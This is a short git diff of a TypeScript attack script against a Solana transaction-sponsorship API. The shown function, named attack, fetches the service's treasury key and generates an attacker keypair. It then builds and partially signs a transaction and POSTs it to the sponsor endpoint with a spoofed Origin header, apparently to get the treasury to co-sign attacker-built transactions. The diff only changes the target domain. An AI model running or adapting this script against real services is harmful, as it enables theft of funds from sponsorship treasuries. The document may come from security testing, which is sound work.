@@ -3,7 +3,7 @@ import { Connection, Transaction, PublicKey, Keypair, TransactionInstruction, Sy
 const SHADOWSPACE = new PublicKey("EEnouVLAoQGMEbrypEhP3Ct5RgCViCWG4n1nCZNwMxjQ");
 
 async function attack(name: string, buildTx: (treasury: PublicKey, attacker: Keypair, blockhash: string) => Transaction) {
-  const res = await fetch("https://www.shyft.lol/api/sponsor-tx");
+  const res = await fetch("https://baddie.stream/api/sponsor-tx");
   const { treasuryPubkey } = await res.json();
   const treasury = new PublicKey(treasuryPubkey);
   const attacker = Keypair.generate();
@@ -13,9 +13,9 @@ async function attack(name: string, buildTx: (treasury: PublicKey, attacker: Key
   const tx = buildTx(treasury, attacker, blockhash);
   tx.partialSign(attacker);
 
-  const attackRes = await fetch("https://www.shyft.lol/api/sponsor-tx", {
+  const attackRes = await fetch("https://baddie.stream/api/sponsor-tx", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Origin": "https://www.shyft.lol" },
+    headers: { "Content-Type": "application/json", "Origin": "https://baddie.stream" },
     body: JSON.stringify({
       transaction: tx.serialize({ requireAllSignatures: false }).toString("base64"),
       walletAddress: attacker.publicKey.toBase58(),
